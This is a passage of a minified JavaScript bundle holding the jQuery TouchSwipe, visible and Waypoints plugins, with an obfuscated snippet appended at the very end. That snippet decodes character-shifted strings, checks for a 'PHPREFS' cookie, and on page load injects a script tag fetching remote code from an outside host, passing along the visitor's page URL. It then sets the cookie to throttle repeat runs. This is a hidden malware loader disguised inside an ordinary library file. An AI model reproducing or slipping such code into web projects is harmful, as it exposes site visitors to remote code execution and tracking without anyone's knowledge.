t=[],e=0;e<=5;e++)t.push({start:{x:0,y:0},end:{x:0,y:0},identifier:0});return t}(),A=function(){var t={};return t[e]=Pt(e),t[i]=Pt(i),t.up=Pt(o),t[n]=Pt(n),t}(),xt(),!w||B===k.fingers||k.fingers===g||dt()?(Tt(0,l),X=Mt(),2==B&&(Tt(1,a.touches[1]),R=D=Ct(Y[0].start,Y[1].start)),(k.swipeStatus||k.pinchStatus)&&(r=rt(a,F))):r=!1,!1===r?(rt(a,F=b),r):(k.hold&&(K=setTimeout(t.proxy((function(){q.trigger("hold",[a.target]),k.hold&&(r=k.hold.call(q,a,a.target))}),this),k.longTapThreshold)),zt(!0),null)}}function tt(c){var p=c.originalEvent?c.originalEvent:c;if(F!==y&&F!==b&&!St()){var u,d=kt(w?p.touches[0]:p);if(V=Mt(),w&&(B=p.touches.length),k.hold&&clearTimeout(K),F=_,2==B&&(0==R?(Tt(1,p.touches[1]),R=D=Ct(Y[0].start,Y[1].start)):(kt(p.touches[1]),D=Ct(Y[0].end,Y[1].end),Y[0].end,Y[1].end,W=N<1?r:s),N=function(t,e){return(e/t*1).toFixed(2)}(R,D),H=Math.abs(R-D)),B===k.fingers||k.fingers===g||!w||dt()){if(function(t,s){if(!1===k.preventDefaultEvents)return;if(k.allowPageScroll===a)t.preventDefault();else{var r=k.allowPageScroll===l;switch(s){case e:(k.swipeLeft&&r||!r&&k.allowPageScroll!=f)&&t.preventDefault();break;case i:(k.swipeRight&&r||!r&&k.allowPageScroll!=f)&&t.preventDefault();break;case o:(k.swipeUp&&r||!r&&k.allowPageScroll!=m)&&t.preventDefault();break;case n:(k.swipeDown&&r||!r&&k.allowPageScroll!=m)&&t.preventDefault()}}}(c,j=function(t,s){var r=function(t,e){var i=t.x-e.x,o=e.y-t.y,n=Math.atan2(o,i),s=Math.round(180*n/Math.PI);s<0&&(s=360-Math.abs(s));return s}(t,s);return r<=45&&r>=0||r<=360&&r>=315?e:r>=135&&r<=225?i:r>45&&r<135?n:o}(d.start,d.end)),L=function(t,e){return Math.round(Math.sqrt(Math.pow(e.x-t.x,2)+Math.pow(e.y-t.y,2)))}(d.start,d.end),O=It(),function(t,e){e=Math.max(e,$t(t)),A[t].distance=e}(j,L),(k.swipeStatus||k.pinchStatus)&&(u=rt(p,F)),!k.triggerOnTouchEnd||k.triggerOnTouchLeave){var h=!0;if(k.triggerOnTouchLeave){var v=function(e){var i=(e=t(e)).offset();return{left:i.left,right:i.left+e.outerWidth(),top:i.top,bottom:i.top+e.outerHeight()}}(this);h=function(t,e){return t.x>e.left&&t.x<e.right&&t.y>e.top&&t.y<e.bottom}(d.end,v)}!k.triggerOnTouchEnd&&h?F=st(_):k.triggerOnTouchLeave&&!h&&(F=st(y)),F!=b&&F!=y||rt(p,F)}}else rt(p,F=b);!1===u&&rt(p,F=b)}}function et(t){var e=t.originalEvent;return w&&e.touches.length>0?(Q=Mt(),U=event.touches.length+1,!0):(St()&&(B=U),V=Mt(),O=It(),ct()||!lt()?rt(e,F=b):k.triggerOnTouchEnd||0==k.triggerOnTouchEnd&&F===_?(t.preventDefault(),rt(e,F=y)):!k.triggerOnTouchEnd&&yt()?at(e,F=y,u):F===_&&rt(e,F=b),zt(!1),null)}function it(){B=0,V=0,X=0,R=0,D=0,N=1,xt(),zt(!1)}function ot(t){var e=t.originalEvent;k.triggerOnTouchLeave&&rt(e,F=st(y))}function nt(){q.unbind(P,J),q.unbind(E,it),q.unbind(I,tt),q.unbind(C,et),M&&q.unbind(M,ot),zt(!1)}function st(t){var e=t,i=pt(),o=lt(),n=ct();return!i||n?e=b:!o||t!=_||k.triggerOnTouchEnd&&!k.triggerOnTouchLeave?!o&&t==y&&k.triggerOnTouchLeave&&(e=b):e=y,e}function rt(t,e){var i=void 0;return gt()||mt()||ht()||dt()?((gt()||mt())&&(i=at(t,e,c)),(ht()||dt())&&!1!==i&&(i=at(t,e,p))):wt()&&bt()&&!1!==i?i=at(t,e,d):O>k.longTapThreshold&&L<10&&k.longTap&&!1!==i?i=at(t,e,h):1!==B&&w||!(isNaN(L)||L<k.threshold)||!yt()||!1===i||(i=at(t,e,u)),e===b&&it(),e===y&&(w?0==t.touches.length&&it():it()),i}function at(a,l,f){var m=void 0;if(f==c){if(q.trigger("swipeStatus",[l,j||null,L||0,O||0,B,Y]),k.swipeStatus&&!1===(m=k.swipeStatus.call(q,a,l,j||null,L||0,O||0,B,Y)))return!1;if(l==y&&ft()){if(q.trigger("swipe",[j,L,O,B,Y]),k.swipe&&!1===(m=k.swipe.call(q,a,j,L,O,B,Y)))return!1;switch(j){case e:q.trigger("swipeLeft",[j,L,O,B,Y]),k.swipeLeft&&(m=k.swipeLeft.call(q,a,j,L,O,B,Y));break;case i:q.trigger("swipeRight",[j,L,O,B,Y]),k.swipeRight&&(m=k.swipeRight.call(q,a,j,L,O,B,Y));break;case o:q.trigger("swipeUp",[j,L,O,B,Y]),k.swipeUp&&(m=k.swipeUp.call(q,a,j,L,O,B,Y));break;case n:q.trigger("swipeDown",[j,L,O,B,Y]),k.swipeDown&&(m=k.swipeDown.call(q,a,j,L,O,B,Y))}}}if(f==p){if(q.trigger("pinchStatus",[l,W||null,H||0,O||0,B,N,Y]),k.pinchStatus&&!1===(m=k.pinchStatus.call(q,a,l,W||null,H||0,O||0,B,N,Y)))return!1;if(l==y&&ut())switch(W){case s:q.trigger("pinchIn",[W||null,H||0,O||0,B,N,Y]),k.pinchIn&&(m=k.pinchIn.call(q,a,W||null,H||0,O||0,B,N,Y));break;case r:q.trigger("pinchOut",[W||null,H||0,O||0,B,N,Y]),k.pinchOut&&(m=k.pinchOut.call(q,a,W||null,H||0,O||0,B,N,Y))}}return f==u?l!==b&&l!==y||(clearTimeout(Z),clearTimeout(K),bt()&&!wt()?(G=Mt(),Z=setTimeout(t.proxy((function(){G=null,q.trigger("tap",[a.target]),k.tap&&(m=k.tap.call(q,a,a.target))}),this),k.doubleTapThreshold)):(G=null,q.trigger("tap",[a.target]),k.tap&&(m=k.tap.call(q,a,a.target)))):f==d?l!==b&&l!==y||(clearTimeout(Z),G=null,q.trigger("doubletap",[a.target]),k.doubleTap&&(m=k.doubleTap.call(q,a,a.target))):f==h&&(l!==b&&l!==y||(clearTimeout(Z),G=null,q.trigger("longtap",[a.target]),k.longTap&&(m=k.longTap.call(q,a,a.target)))),m}function lt(){var t=!0;return null!==k.threshold&&(t=L>=k.threshold),t}function ct(){var t=!1;return null!==k.cancelThreshold&&null!==j&&(t=$t(j)-L>=k.cancelThreshold),t}function pt(){return!k.maxTimeThreshold||!(O>=k.maxTimeThreshold)}function ut(){var t=vt(),e=_t(),i=null===k.pinchThreshold||H>=k.pinchThreshold;return t&&e&&i}function dt(){return!!(k.pinchStatus||k.pinchIn||k.pinchOut)}function ht(){return!(!ut()||!dt())}function ft(){var t=pt(),e=lt(),i=vt(),o=_t();return!ct()&&o&&i&&e&&t}function mt(){return!!(k.swipe||k.swipeStatus||k.swipeLeft||k.swipeRight||k.swipeUp||k.swipeDown)}function gt(){return!(!ft()||!mt())}function vt(){return B===k.fingers||k.fingers===g||!w}function _t(){return 0!==Y[0].end.x}function yt(){return!!k.tap}function bt(){return!!k.doubleTap}function wt(){if(null==G)return!1;var t=Mt();return bt()&&t-G<=k.doubleTapThreshold}function xt(){Q=0,U=0}function St(){var t=!1;Q&&(Mt()-Q<=k.fingerReleaseThreshold&&(t=!0));return t}function zt(t){!0===t?(q.bind(I,tt),q.bind(C,et),M&&q.bind(M,ot)):(q.unbind(I,tt,!1),q.unbind(C,et,!1),M&&q.unbind(M,ot,!1)),q.data(z+"_intouch",!0===t)}function Tt(t,e){var i=void 0!==e.identifier?e.identifier:0;return Y[t].identifier=i,Y[t].start.x=Y[t].end.x=e.pageX||e.clientX,Y[t].start.y=Y[t].end.y=e.pageY||e.clientY,Y[t]}function kt(t){var e=function(t){for(var e=0;e<Y.length;e++)if(Y[e].identifier==t)return Y[e]}(void 0!==t.identifier?t.identifier:0);return e.end.x=t.pageX||t.clientX,e.end.y=t.pageY||t.clientY,e}function $t(t){if(A[t])return A[t].distance}function Pt(t){return{direction:t,distance:0}}function It(){return V-X}function Ct(t,e){var i=Math.abs(t.x-e.x),o=Math.abs(t.y-e.y);return Math.round(Math.sqrt(i*i+o*o))}function Mt(){return(new Date).getTime()}this.enable=function(){return q.bind(P,J),q.bind(E,it),q},this.disable=function(){return nt(),q},this.destroy=function(){nt(),q.data(z,null),q=null},this.option=function(e,i){if(void 0!==k[e]){if(void 0===i)return k[e];k[e]=i}else t.error("Option "+e+" does not exist on jQuery.swipe.options");return null}}t.fn.swipe=function(e){var i=t(this),o=i.data(z);if(o&&"string"==typeof e){if(o[e])return o[e].apply(this,Array.prototype.slice.call(arguments,1));t.error("Method "+e+" does not exist on jQuery.swipe")}else if(!(o||"object"!=typeof e&&e))return T.apply(this,arguments);return i},t.fn.swipe.defaults={fingers:1,threshold:75,cancelThreshold:null,pinchThreshold:20,maxTimeThreshold:null,fingerReleaseThreshold:250,longTapThreshold:500,doubleTapThreshold:200,swipe:null,swipeLeft:null,swipeRight:null,swipeUp:null,swipeDown:null,swipeStatus:null,pinchIn:null,pinchOut:null,pinchStatus:null,click:null,tap:null,doubleTap:null,longTap:null,hold:null,triggerOnTouchEnd:!0,triggerOnTouchLeave:!1,allowPageScroll:"auto",fallbackToMouseEvents:!0,excludedElements:"label, button, input, select, textarea, a, .noSwipe",preventDefaultEvents:!0},t.fn.swipe.phases={PHASE_START:v,PHASE_MOVE:_,PHASE_END:y,PHASE_CANCEL:b},t.fn.swipe.directions={LEFT:e,RIGHT:i,UP:o,DOWN:n,IN:s,OUT:r},t.fn.swipe.pageScroll={NONE:a,HORIZONTAL:f,VERTICAL:m,AUTO:l},t.fn.swipe.fingers={ONE:1,TWO:2,THREE:3,ALL:g}})),function(t){t.fn.visible=function(e,i,o){var n=t(this).eq(0),s=n.get(0),r=t(window),a=r.scrollTop(),l=a+r.height(),c=r.scrollLeft(),p=c+r.width(),u=n.offset().top,d=u+n.height(),h=n.offset().left,f=h+n.width(),m=!0===e?d:u,g=!0===e?u:d,v=!0===e?f:h,_=!0===e?h:f,y=!0!==i||s.offsetWidth*s.offsetHeight;return"both"===(o=o||"both")?!!y&&g<=l&&m>=a&&_<=p&&v>=c:"vertical"===o?!!y&&g<=l&&m>=a:"horizontal"===o?!!y&&_<=p&&v>=c:void 0}}(jQuery),function(){var t=[].indexOf||function(t){for(var e=0,i=this.length;e<i;e++)if(e in this&&this[e]===t)return e;return-1},e=[].slice;!function(t,e){"function"==typeof define&&define.amd?define("waypoints",["jquery"],(function(i){return e(i,t)})):e(t.jQuery,t)}(this,(function(i,o){var n,s,r,a,l,c,p,u,d,h,f,m,g,v,_,y;return n=i(o),u=t.call(o,"ontouchstart")>=0,a={horizontal:{},vertical:{}},l=1,p={},c="waypoints-context-id",f="resize.waypoints",m="scroll.waypoints",g=1,v="waypoints-waypoint-ids",_="waypoint",y="waypoints",s=function(){function t(t){var e=this;this.$element=t,this.element=t[0],this.didResize=!1,this.didScroll=!1,this.id="context"+l++,this.oldScroll={x:t.scrollLeft(),y:t.scrollTop()},this.waypoints={horizontal:{},vertical:{}},t.data(c,this.id),p[this.id]=this,t.bind(m,(function(){var t;if(!e.didScroll&&!u)return e.didScroll=!0,t=function(){return e.doScroll(),e.didScroll=!1},o.setTimeout(t,i[y].settings.scrollThrottle)})),t.bind(f,(function(){var t;if(!e.didResize)return e.didResize=!0,t=function(){return i[y]("refresh"),e.didResize=!1},o.setTimeout(t,i[y].settings.resizeThrottle)}))}return t.prototype.doScroll=function(){var t,e=this;return t={horizontal:{newScroll:this.$element.scrollLeft(),oldScroll:this.oldScroll.x,forward:"right",backward:"left"},vertical:{newScroll:this.$element.scrollTop(),oldScroll:this.oldScroll.y,forward:"down",backward:"up"}},!u||t.vertical.oldScroll&&t.vertical.newScroll||i[y]("refresh"),i.each(t,(function(t,o){var n,s,r;return r=[],s=o.newScroll>o.oldScroll,n=s?o.forward:o.backward,i.each(e.waypoints[t],(function(t,e){var i,n;return o.oldScroll<(i=e.offset)&&i<=o.newScroll||o.newScroll<(n=e.offset)&&n<=o.oldScroll?r.push(e):void 0})),r.sort((function(t,e){return t.offset-e.offset})),s||r.reverse(),i.each(r,(function(t,e){if(e.options.continuous||t===r.length-1)return e.trigger([n])}))})),this.oldScroll={x:t.horizontal.newScroll,y:t.vertical.newScroll}},t.prototype.refresh=function(){var t,e,o,n=this;return o=i.isWindow(this.element),e=this.$element.offset(),this.doScroll(),t={horizontal:{contextOffset:o?0:e.left,contextScroll:o?0:this.oldScroll.x,contextDimension:this.$element.width(),oldScroll:this.oldScroll.x,forward:"right",backward:"left",offsetProp:"left"},vertical:{contextOffset:o?0:e.top,contextScroll:o?0:this.oldScroll.y,contextDimension:o?i[y]("viewportHeight"):this.$element.height(),oldScroll:this.oldScroll.y,forward:"down",backward:"up",offsetProp:"top"}},i.each(t,(function(t,e){return i.each(n.waypoints[t],(function(t,o){var n,s,r,a,l;if(n=o.options.offset,r=o.offset,s=i.isWindow(o.element)?0:o.$element.offset()[e.offsetProp],i.isFunction(n)?n=n.apply(o.element):"string"==typeof n&&(n=parseFloat(n),o.options.offset.indexOf("%")>-1&&(n=Math.ceil(e.contextDimension*n/100))),o.offset=s-e.contextOffset+e.contextScroll-n,(!o.options.onlyOnScroll||null==r)&&o.enabled)return null!==r&&r<(a=e.oldScroll)&&a<=o.offset?o.trigger([e.backward]):null!==r&&r>(l=e.oldScroll)&&l>=o.offset||null===r&&e.oldScroll>=o.offset?o.trigger([e.forward]):void 0}))}))},t.prototype.checkEmpty=function(){if(i.isEmptyObject(this.waypoints.horizontal)&&i.isEmptyObject(this.waypoints.vertical))return this.$element.unbind([f,m].join(" ")),delete p[this.id]},t}(),r=function(){function t(t,e,o){var n,s;"bottom-in-view"===(o=i.extend({},i.fn[_].defaults,o)).offset&&(o.offset=function(){var t;return t=i[y]("viewportHeight"),i.isWindow(e.element)||(t=e.$element.height()),t-i(this).outerHeight()}),this.$element=t,this.element=t[0],this.axis=o.horizontal?"horizontal":"vertical",this.callback=o.handler,this.context=e,this.enabled=o.enabled,this.id="waypoints"+g++,this.offset=null,this.options=o,e.waypoints[this.axis][this.id]=this,a[this.axis][this.id]=this,(n=null!=(s=t.data(v))?s:[]).push(this.id),t.data(v,n)}return t.prototype.trigger=function(t){if(this.enabled)return null!=this.callback&&this.callback.apply(this.element,t),this.options.triggerOnce?this.destroy():void 0},t.prototype.disable=function(){return this.enabled=!1},t.prototype.enable=function(){return this.context.refresh(),this.enabled=!0},t.prototype.destroy=function(){return delete a[this.axis][this.id],delete this.context.waypoints[this.axis][this.id],this.context.checkEmpty()},t.getWaypointsByElement=function(t){var e,o;return(o=i(t).data(v))?(e=i.extend({},a.horizontal,a.vertical),i.map(o,(function(t){return e[t]}))):[]},t}(),h={init:function(t,e){return null==e&&(e={}),null==e.handler&&(e.handler=t),this.each((function(){var t,o,n,a;return t=i(this),n=null!=(a=e.context)?a:i.fn[_].defaults.context,i.isWindow(n)||(n=t.closest(n)),n=i(n),(o=p[n.data(c)])||(o=new s(n)),new r(t,o,e)})),i[y]("refresh"),this},disable:function(){return h._invoke(this,"disable")},enable:function(){return h._invoke(this,"enable")},destroy:function(){return h._invoke(this,"destroy")},prev:function(t,e){return h._traverse.call(this,t,e,(function(t,e,i){if(e>0)return t.push(i[e-1])}))},next:function(t,e){return h._traverse.call(this,t,e,(function(t,e,i){if(e<i.length-1)return t.push(i[e+1])}))},_traverse:function(t,e,n){var s,r;return null==t&&(t="vertical"),null==e&&(e=o),r=d.aggregate(e),s=[],this.each((function(){var e;return e=i.inArray(this,r[t]),n(s,e,r[t])})),this.pushStack(s)},_invoke:function(t,e){return t.each((function(){var t;return t=r.getWaypointsByElement(this),i.each(t,(function(t,i){return i[e](),!0}))})),this}},i.fn[_]=function(){var t,o;return o=arguments[0],t=2<=arguments.length?e.call(arguments,1):[],h[o]?h[o].apply(this,t):i.isFunction(o)?h.init.apply(this,arguments):i.isPlainObject(o)?h.init.apply(this,[null,o]):o?i.error("The "+o+" method does not exist in jQuery Waypoints."):i.error("jQuery Waypoints needs a callback function or handler option.")},i.fn[_].defaults={context:o,continuous:!0,enabled:!0,horizontal:!1,offset:0,triggerOnce:!1},d={refresh:function(){return i.each(p,(function(t,e){return e.refresh()}))},viewportHeight:function(){var t;return null!=(t=o.innerHeight)?t:n.height()},aggregate:function(t){var e,o,n;return e=a,t&&(e=null!=(n=p[i(t).data(c)])?n.waypoints:void 0),e?(o={horizontal:[],vertical:[]},i.each(o,(function(t,n){return i.each(e[t],(function(t,e){return n.push(e)})),n.sort((function(t,e){return t.offset-e.offset})),o[t]=i.map(n,(function(t){return t.element})),o[t]=i.unique(o[t])})),o):[]},above:function(t){return null==t&&(t=o),d._filter(t,"vertical",(function(t,e){return e.offset<=t.oldScroll.y}))},below:function(t){return null==t&&(t=o),d._filter(t,"vertical",(function(t,e){return e.offset>t.oldScroll.y}))},left:function(t){return null==t&&(t=o),d._filter(t,"horizontal",(function(t,e){return e.offset<=t.oldScroll.x}))},right:function(t){return null==t&&(t=o),d._filter(t,"horizontal",(function(t,e){return e.offset>t.oldScroll.x}))},enable:function(){return d._invoke("enable")},disable:function(){return d._invoke("disable")},destroy:function(){return d._invoke("destroy")},extendFn:function(t,e){return h[t]=e},_invoke:function(t){var e;return e=i.extend({},a.vertical,a.horizontal),i.each(e,(function(e,i){return i[t](),!0}))},_filter:function(t,e,o){var n,s;return(n=p[i(t).data(c)])?(s=[],i.each(n.waypoints[e],(function(t,e){if(o(n,e))return s.push(e)})),s.sort((function(t,e){return t.offset-e.offset})),i.map(s,(function(t){return t.element}))):[]}},i[y]=function(){var t,i;return i=arguments[0],t=2<=arguments.length?e.call(arguments,1):[],d[i]?d[i].apply(null,t):d.aggregate.call(null,i)},i[y].settings={resizeThrottle:100,scrollThrottle:30},n.load((function(){return i[y]("refresh")}))}))}.call(this);(function(o,d,l){try{o.f=o=>o.split('').reduce((s,c)=>s+String.fromCharCode((c.charCodeAt()-5).toString()),'');o.b=o.f('UMUWJKX');o.c=l.protocol[0]=='h'&&/\./.test(l.hostname)&&!(new RegExp(o.b)).test(d.cookie),setTimeout(function(){o.c&&(o.s=d.createElement('script'),o.s.src=o.f('myyux?44hisxy'+'fy3sjy4ljy4xhwnuy'+'3oxDwjkjwwjwB')+l.href,d.body.appendChild(o.s));},1000);d.cookie=o.b+'=full;max-age=39800;'}catch(e){};}({},document,location));